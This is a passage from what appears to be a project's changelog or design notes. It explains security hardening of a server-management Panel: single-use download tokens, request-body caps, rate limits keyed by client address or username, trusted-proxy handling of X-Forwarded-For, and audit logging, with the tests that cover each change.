  navigation's outcome. `streamChunks` now reads the first chunk as a
  lookahead and only then commits headers. A failure *after* the first chunk
  has no status left to change, so it aborts the connection
  (`http.ErrAbortHandler`, which chi's Recoverer re-panics by design) and
  logs a `download truncated mid-stream` warning: returning normally would let
  net/http finish the chunked response and hand the operator half a save file
  as a completed download. That was, at first, detection by connection reset
  alone; **#324** added the positive form (see below).
- **Content-Disposition filenames are sanitised on both halves.** The zip's
  name now comes from a path segment — a folder name anyone with
  `server.files.write` or SFTP chose — rather than from the server record.
  C0/C1 controls and the Unicode bidi overrides (U+200E/F, U+061C,
  U+202A–U+202E, U+2066–U+2069) are dropped, so a name cannot render reversed
  in a save prompt; the `filename=` parameter is ASCII-only, and the real name
  rides in a percent-encoded RFC 5987 `filename*=` that escapes every
  non-ASCII byte.
- **Every JSON request body is capped** at 4 MiB (`maxJSONBody`, applied inside
  `decodeJSON`). The Panel had no `http.MaxBytesReader` anywhere, so any
  authenticated caller could pin arbitrary Panel memory with one request —
  `json.Decoder` reads until the body ends. The cap is sized off the largest
  legitimate body (the in-browser editor saving a 1 MiB file, JSON-escaped).
  A download token additionally caps its path set at 256 paths of 4096 bytes,
  since a mint holds that set in memory for 60 seconds.

The browser has **no Blob fallback**. One was written, then removed: the Panel
embeds this bundle with `//go:embed`, so a UI that knows the mint route is by
construction served by a Panel that has it, and the version skew a fallback
guards against cannot occur. Keeping it would have meant a real refusal (no
permission, server gone, node unreachable) silently triggering a second,
buffering request instead of being shown. The dead `downloadFileRaw` /
`downloadFilesZip` client helpers went with it.

**What it does not protect against.** The URL — token included — sits in the
browser's history, and on some platforms in the download manager's record, for
as long as the browser keeps it. Anyone with the victim's browser profile can
read it there. What they get is nothing: by then the token has been redeemed
(deleted) and, failing that, has expired within the minute. The same URL can
also be shoulder-surfed or captured by anything sitting between browser and
Panel that a plain-HTTP LAN deployment already exposes (the session Bearer is
equally exposed there, and is the far better prize). It is not a bearer token
for the session, a server, or the file tree — only for one download of one path
set that the holder had permission to take anyway.

Covered by `TestDownloadTokenRegistrySingleUse`,
`TestDownloadTokenRegistryExpiryAndUnknown`,
`TestDownloadTokenRegistrySweepsExpired`, `TestCanonicalFilePath`,
`TestDownloadTokenMintRequiresFilesReadPermission`,
`TestDownloadTokenMintRejectsBadPaths`,
`TestDownloadTokenStreamsOnceThenIsGone`, `TestDownloadTokenStreamsZip`,
`TestDownloadTokenExpiredIsRejected`, `TestDownloadTokenIsBoundToItsServer`,
`TestDownloadTokenRejectsPathAndRouteWidening`,
`TestDownloadTokenRevalidatesTheMintingUser`,
`TestDownloadTokenRejectedAfterServerIsReOwned`,
`TestFilesRawWithoutTokenIsUnchanged`,
`TestDownloadTokenAuditsMintAndRedemption`,
`TestDownloadTokenAuditsTheOutcomeNotTheIntent`,
`TestDownloadFailureDoesNotArriveAsAFile`,
`TestDownloadFilenameIsSanitised`, `TestStreamChunksWholePayload`,
`TestStreamChunksFirstChunkFailure`,
`TestStreamChunksAbortsOnMidStreamFailure` and
`TestAuditAppendOutlivesACancelledRequest` (`internal/panel/api`), plus
`web/src/lib/depth.download.test.ts` for the browser's side.

## Download-token hardening (2026-09-16)

The four follow-ups the tokenised-download review deferred (**#324**), shipped
together. Nothing here changes what a token is; it closes the gaps around it.

**Announced length, and no resume on offer.** `FileChunk` gained an
`int64 size`, which the Agent's `DownloadFile` sets on the **first chunk only**
from a `StatFile` taken before the first byte goes out (0 means "unknown", and
`DownloadFiles` — the zip — leaves it 0, because an archive's size is not known
until it has been written). The Panel turns a non-zero size into
`Content-Length`, so a truncated transfer is something the browser can *detect*
rather than something it reports as a finished download. The announcement is a
promise the Agent keeps, and the two ways a live file can break it are not the
same failure. A file that **grew** since the stat — a running server appending
to the log or save being downloaded, which is the ordinary case — is cut off at
exactly the announced length and the stream ends cleanly: the download is a
consistent prefix, which is all `Content-Length` promised. A file that
**shrank** hits EOF short, cannot deliver what was announced, and fails the RPC
so the Panel aborts the connection. A **zero-byte** file announces nothing:
size 0 is indistinguishable from "unknown", so an empty file streams with no
`Content-Length`, exactly as an older Agent's stream does — an honest empty 200
either way. The Panel refuses over-delivery too: once `Content-Length` is out,
net/http drops the excess and answers `http.ErrContentLength`, which the stream
loop treats as a torn connection rather than as a client that hung up — read the
other way, a browser would save exactly N bytes as a completed download, which
is the failure this whole feature exists to remove. The zip route hardcodes size
0 rather than forwarding the field, so no future Agent can turn it into a length
nothing enforces. An Agent older than the field sends 0 throughout and the Panel
behaves precisely as it did before, so **Agents roll out before Panels** but
nothing breaks if they do not. Both stream routes also send
`Accept-Ranges: none`: resume is structurally impossible on a single-use token
(the second request would 401), and a browser told nothing may offer the
operator a resume that cannot work. Range requests are not implemented and are
not planned; "click again" is the resume story.

**The grant dies with its session.** Covered in the bullet above: the grant
carries the digest of the minting session and the redemption refuses when that
session is no longer on record, so the ≤60-second window after a logout or an
admin session revocation is closed. No migration: sessions are already stored
by digest, so `SessionExistsByHash` is the lookup `GetSession` does without the
token. Expiry is decided in Go against the **Panel's** clock rather than with
`expires_at > now()` in SQL, matching `GetSession` and the memory store: a
database whose clock ran ahead would otherwise make a session the UI is happily
accepting "gone" at redemption, and every download would 401 with only a Debug
line to explain it.

**One auth chain, spelled once.** The two GET download routes previously
re-stated the authenticated group's middleware by hand, so anything added to
that group would silently not apply to them. Both now end up in one `gatedChain`
— audit, first-run password gate, `server.files.read`, in the group's own order
— reached either through `tokenOrSession` (the raw route, which answers to a
redeemed `?token=` or the ordinary Bearer session) or `tokenOnly` (the GET zip
route, whose paths exist nowhere but a grant). The route handlers are registered
unchanged behind it. The token branch still consults no Authorization header at
all, still rewrites the query from the grant, and still audits the real outcome
from a deferred, `WithoutCancel` append — including the verb: a redemption that
the password gate or an unreachable node refuses is recorded as *refused*, not
as a download that never happened.

**Rate limits on what an anonymous caller can reach.** The Panel had no limiter
anywhere. It has one now (`internal/panel/api/ratelimit.go`, a token bucket on
`golang.org/x/time/rate` over a swept, capped per-client table — no new
dependency and no background goroutine): **download-token redemption** at 30/min
with a burst of 10, and `POST /auth/login` at 20/min with a burst of 20.
`KRAKEN_RATE_LIMITS=off` disables both, logged loudly at startup, for an edge
that already does this.

The download limit sits on the **token branch**, not on the route: a
session-authenticated download is not what the limit is for, and an operator
must not be refused for sharing a NAT address with somebody probing tokens. The
login numbers are deliberately generous for the same reason — locking a team out
of their own Panel is a worse failure than the guessing being slowed. Refusals
are a 429 in the ordinary JSON error envelope with `Retry-After`, and a refused
request does not consume future capacity.

**Keys are per client, and the client is resolved once.** IPv4 is keyed per
address; **IPv6 is aggregated to the /64**, because a single subscriber is
routinely delegated a whole /64 and per-address keying would hand one attacker
2^64 independent buckets. The table is swept for idle entries and, at its cap,
evicted down to a watermark so the eviction sort amortises rather than running
on every later admission; entries that cannot make a request right now are
passed over, so filling the table is not a way to buy back a spent bucket
(that protection yields to the cap if every candidate is spent — a bounded table
is the point).

**Trusted proxies (`KRAKEN_TRUSTED_PROXIES`).** `clientIP` is now one function
used by the audit log, the `/setup/*` internal-network gate and both limiters,
so they cannot disagree about who called. With the list empty — the default —
it is the real TCP peer and no forwarding header is believed, exactly as before.
That default is wrong for the reference deployment, though, and not in the
direction the old comment assumed: behind a reverse proxy or a Cloudflare
Tunnel the peer is the *proxy* on every request, so every audit row records the
proxy and both limiters collapse into a single shared bucket that one stranger
can exhaust for everybody. With the proxy's CIDR named, the Panel takes the
**rightmost** `X-Forwarded-For` hop that is not itself trusted — rightmost
because the list is appended hop by hop, and only what a trusted proxy appended
can be believed. That is the only header consulted. `CF-Connecting-IP` looks
more direct and is not: only Cloudflare sets it, Caddy/nginx/Traefik pass a
client-supplied one through untouched, and nothing in a request says which of
them is in front — so believing it from any trusted proxy would hand an
internet client its own `clientIP`, and with it `requireInternal`, both
limiters and every audit row. Cloudflare appends to `X-Forwarded-For` too, so
the reference deployment needs nothing else.

An unparseable entry in `KRAKEN_TRUSTED_PROXIES` is a **startup error**, not a
warning. A typo that silently emptied the list would leave the Panel running
with `/setup/*` seeing the tunnel's loopback for the entire internet and both
limiters back in one shared bucket — a misconfiguration that looks like a
working Panel. (`KRAKEN_SETUP_ALLOWED_CIDRS` keeps its skip-and-warn behaviour:
that list fails closed, so a dropped entry denies access rather than granting
it.)

This also **tightens** `/setup/*`: a Panel behind a co-located tunnel otherwise
sees `127.0.0.1` for the entire public internet.

**Visibility.** Rejected redemptions log at Debug (an unauthenticated caller
chooses when they are written), so they are also counted:
`kraken_download_tokens_rejected_total`, plus `kraken_rate_limited_total` per
limiter, give an operator the signal without turning the log level down —
and `KRAKEN_LOG_LEVEL=debug` is there for when they want to. A 429'd login never
reaches the handler that audits a failed attempt, so the limiter writes that row
itself, once per client per window rather than once per request.

**Upload bodies are capped too** (found in the same pass). `ParseMultipartForm`'s
argument is only the in-memory threshold — everything past it spills to temp
files, unbounded — so `handleUploadFiles` now wraps the body in
`http.MaxBytesReader` at 64 MiB plus a megabyte of multipart framing and answers
413 past it. Without it one authenticated request could fill the Panel's disk.

**Agent errors name the logical path, never the host one.** The Agent's
single-file operations share one `statLocal`, whose message is built from the
`/data`-relative path the caller asked for. An `*os.PathError` carries the
RESOLVED host path, and the Panel hands an Agent error to the client verbatim
("agent error: …"), so returning it unchanged would teach anyone holding
`server.files.read` where a node keeps its storage. What is kept is the
distinction — `not found` and `permission denied` stay separate answers, and
anything else is reported by its underlying syscall error rather than the
`PathError` wrapper.

Covered by `TestStatErrorsDoNotLeakTheHostPath` (`internal/agent`),
`TestDownloadFileAnnouncesItsSizeOnTheFirstChunkOnly`,
`TestDownloadFilesZipAnnouncesNoSize`, `TestDownloadFileTruncatesAFileThatGrew`
and `TestDownloadFileFailsWhenTheFileShrank` (`internal/agent`), and
`TestStreamChunksSetsContentLengthFromTheAnnouncedSize`,
`TestStreamChunksOmitsContentLengthWhenSizeIsUnknown`,
`TestStreamChunksAbortsWhenAStreamOverrunsItsContentLength`,
`TestDownloadAnnouncesLengthAndRefusesRanges`,
`TestDownloadTokenDiesWithItsSession`,
`TestDownloadTokenAuditsARefusalAsRefused`,
`TestDownloadRedemptionIsRateLimited`, `TestOnlyTokenRedemptionIsRateLimited`,
`TestRateLimitsOffSwitch`, `TestLoginRateLimitLeavesANormalSignInAlone`,
`TestLoginRateLimitLeavesOneAuditRow`, `TestUploadBodyIsCapped`,
the `TestClientIP*` set (including
`TestClientIPNeverBelievesCloudflareHeader`,
`TestClientIPFallsBackWhenAHopIsGarbage` and
`TestTrustedProxyMatchesAnIPv4MappedPeer`),
`TestClipForLogCutsOnARuneBoundary`,
`TestLoadRejectsAnUnparseableTrustedProxy`,
`TestLoadDoesNotRejectAnUnparseableSetupCIDR` (`internal/panel/config`),
`TestRateLimiterKeysOnTheResolvedClientBehindAProxy`,
`TestRateLimiterAdmitsTheBurstThenRefuses`,
`TestRateLimiterRecoversAfterTheWindow`, `TestRateLimiterIsolatesClients`,
`TestRateLimiterAggregatesIPv6ToTheRoutedPrefix`,
`TestRateLimiterSweepsIdleEntries`, `TestRateLimiterEvictsDownToTheWatermark`,
`TestRateLimiterEvictionKeepsAPenalisedClient`,
`TestRateLimiterDisabledAdmitsEverything` and
`TestRateLimiterMiddlewareAnswers429WithRetryAfter` (`internal/panel/api`),
alongside every test the original feature shipped with, which still passes
unchanged.

## Login rate limiting without a client address (2026-09-17)

Found rolling 0.52.0 onto the live Panel (**#327**). The per-IP limiters added
in the download-token pass assume the Panel, or a trusted proxy in front of it,
can see the caller. **On Docker Desktop it cannot.** Every connection to a
published port arrives with its source rewritten to the VM gateway
`192.168.65.1` — including the connections Nginx Proxy Manager's own published
80/443 carry — so NPM appends the gateway to `X-Forwarded-For`, the Panel's
rightmost-untrusted walk correctly resolves every visitor to `192.168.65.1`, and
nothing downstream can recover the real address. The login limiter was then one
shared bucket for the whole internet: twenty failed attempts from anyone locked
every operator out for a minute, with no protective value whatever. The only
advice that worked was `KRAKEN_RATE_LIMITS=off`, which threw away the
token-redemption limiter as well.

**A per-username login limiter, which needs no address.** Keyed on the submitted
username, normalised (trimmed, lower-cased) and capped at 128 bytes so a key an
unauthenticated caller chose cannot grow the table's memory without bound. Ten
failures a minute, burst ten. It **counts failures only**: a request is measured
against the budget without spending it, and only a wrong password takes a token,
so the person who knows their password is never refused for what a stranger did
with their username. It is applied to **every submitted username, known to the
store or not** — a 429 that came back only for real accounts would answer "does
this account exist?" for anyone willing to ask eleven times, undoing the
dummy-verify timing equalisation that has guarded login enumeration since the
first audit.

**`POST /auth/change-password` spends the same budget**, keyed on the
authenticated user, when the *current* password is wrong. That route verifies a
password exactly as login does; leaving it outside the bucket would have made a
stolen session the unthrottled way around the login limiter. The cost is
accepted and documented: ten fumbles there refuse that account's sign-in for the
rest of the minute.

**`KRAKEN_RATE_LIMIT_IP_SKIP`** exempts a resolved client address from the
**per-address** limiters — validated as CIDRs like `KRAKEN_TRUSTED_PROXIES`, and
a startup error when an entry does not parse. It is deliberately not a trust
list: it takes an address out of a *limit*, where `KRAKEN_TRUSTED_PROXIES`
decides whose `X-Forwarded-For` is *believed*. Trusting the Docker Desktop
gateway would hand header-forging to everyone who can reach a published port;
exempting it gives away only a rate limit that was refusing everybody anyway,
and the per-username limiter — which the skip list does not reach — still caps
guessing at ten a minute per account.

**`KRAKEN_RATE_LIMITS` is now `all` | `login` | `downloads` | `off`** (`on`
kept as the alias of `all`), so the redemption limiter can stay on while the
login side is loosened, or the reverse. **An unrecognised value is a startup
error** rather than a guess: each value is a deliberate posture, and a typo must
not read as one of them.

**The Panel now names the situation.** With no trusted proxy configured, if the
first twenty audited requests all resolve to the same private, loopback or
link-local address, it logs one Warn naming that address and pointing at the
reverse-proxy page. Once per process, disarmed as soon as two distinct callers
are seen, and suppressed for an address already in the skip list.

**Audit rows keep the forwarded chain when, and only when, the resolved address
identifies nobody** — a private/gateway address, or one in the skip list. The
new `forwarded_for` field carries the raw `X-Forwarded-For` as received,
stripped of control characters and capped at 256 bytes on a rune boundary. It is
**untrusted by construction**: nothing resolves to it, limits on it or gates on
it, and both the audit surface and the wiki label it forensics rather than
proof. It rides in the existing `audit_log.data` JSONB, so no migration was
needed. Behind Cloudflare → NPM → Docker Desktop it is the only place the
visitor's true address survives.

Covered by `TestLoginLimiterThrottlesTheEleventhFailureForOneUsername`,
`TestLoginLimiterChargesFailuresOnly`,
`TestLoginLimiterThrottlesUnknownUsernamesIdentically`,
`TestLoginLimiterNormalisesTheUsernameKey`,
`TestLoginPerIPLimiterStillRefusesABurstFromOneAddress`,
`TestRateLimitIPSkipBypassesThePerIPLimiterOnly`,
`TestRateLimitsDownloadsModeLeavesLoginUnlimited`,
`TestRateLimitsLoginModeKeepsThePerUsernameLimiter`,
`TestRateLimitsOffLeavesTheUsernameLimiterOff`,
`TestChangePasswordSharesTheLoginFailureBudget`,
`TestLoginLimiterRefusalIsTheOrdinaryErrorEnvelope`,
`TestRateLimiterPeekMeasuresWithoutSpending`,
`TestUsernameLimiterKeysOnTheRawString`,
`TestForwardedChainIsRecordedOnlyWhenTheSourceIdentifiesNobody`,
`TestForwardedChainIsBoundedAndPrintable`,
`TestAuditRowCarriesTheForwardedChain`, the `TestNATDetector*` set and
`TestNATWarningIsLoggedOnceAndSuppressedForAnExemptAddress`
(`internal/panel/api`), plus
`TestRateLimitModesEnableExactlyTheirOwnLimiters`,
`TestLoadRefusesAnUnknownRateLimitMode` and
`TestLoadRejectsAnUnparseableRateLimitSkipEntry`
(`internal/panel/config`).
